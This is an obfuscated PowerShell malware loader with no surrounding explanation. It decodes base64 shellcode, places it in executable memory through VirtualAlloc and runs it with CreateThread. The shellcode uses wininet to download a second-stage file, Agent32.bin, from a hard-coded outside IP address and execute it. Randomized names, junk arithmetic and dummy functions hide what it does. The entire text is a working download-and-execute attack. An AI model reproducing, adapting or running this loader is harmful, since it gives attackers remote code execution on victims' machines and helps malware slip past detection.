Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public static class HPOBsxbeqfdvNcUhJziTb {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr bAmDjWVBprKSZRAdzgyek, uint ASQPCWkaqSZeRLviXuaGB, uint eIGMWFpERXAJpLXFznDbO, uint iOrpVJiybrbDMzhjjnBDC);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr OObIuRQjaxSWXjAvieMpp, uint VKgJsPMJlROVvLPXkvaIT, IntPtr VEuRTMRYZXrhnDLuzgPlI, IntPtr VKRCjKncSvCnUnrqXEbeC, uint uuTqJhfTOiPLSQAWvtInj, IntPtr bbcUOAwYseAiMJHejGCaU);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr uyOXLhSYBHKxuZEvUYnKk, int dKBVmnyBKSzxIdacVZdPu);
}
'@


[Byte[]]$pIHPveWQlqDEIBvdVJqFb = [System.Convert]::FromBase64String((-join('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'.Substring(17, 2712))))

Function YDdOnaHbKHNwIZLcqWhyz() {
return 0

}
$pvTfycNrRpRgRnUSITLcv = YDdOnaHbKHNwIZLcqWhyz

[IntPtr]$vTBGQcqVztwdZioMMeouZ = [HPOBsxbeqfdvNcUhJziTb]::VirtualAlloc(($pvTfycNrRpRgRnUSITLcv),$pIHPveWQlqDEIBvdVJqFb.Length,(-3102 + 7198),(8704 - 8640))

Function QsrhUppUdIHnkAmDneuWi() {
return 64

}
$ravbHlxwpBslLRwtSJbGi = QsrhUppUdIHnkAmDneuWi

[IntPtr]$vTBGQcqVztwdZioMMeouZ = [HPOBsxbeqfdvNcUhJziTb]::VirtualAlloc((-1140 + 1140),$pIHPveWQlqDEIBvdVJqFb.Length,(-1270 + 5366),($ravbHlxwpBslLRwtSJbGi))

if (187428196 -gt -837486286) {
[Runtime.InteropServices.Marshal]::Copy($pIHPveWQlqDEIBvdVJqFb,(7123 - 7123),$vTBGQcqVztwdZioMMeouZ,$pIHPveWQlqDEIBvdVJqFb.Length)
} else {

}


Function RLssQgfEZFoGlkcnRfpWG() {
return 0

}
$utVwGItxMPdxThvdnwTYZ = RLssQgfEZFoGlkcnRfpWG

$vOmJxCsLxWDvBqNcpAtrP = [HPOBsxbeqfdvNcUhJziTb]::CreateThread((8843 - 8843),(8354 - 8354),$vTBGQcqVztwdZioMMeouZ,(-595 + 595),($utVwGItxMPdxThvdnwTYZ),(5125 - 5125))

if (-275690184 -le 2107419033) {
[HPOBsxbeqfdvNcUhJziTb]::WaitForSingleObject($vOmJxCsLxWDvBqNcpAtrP,0xffffffff)
} else {

}

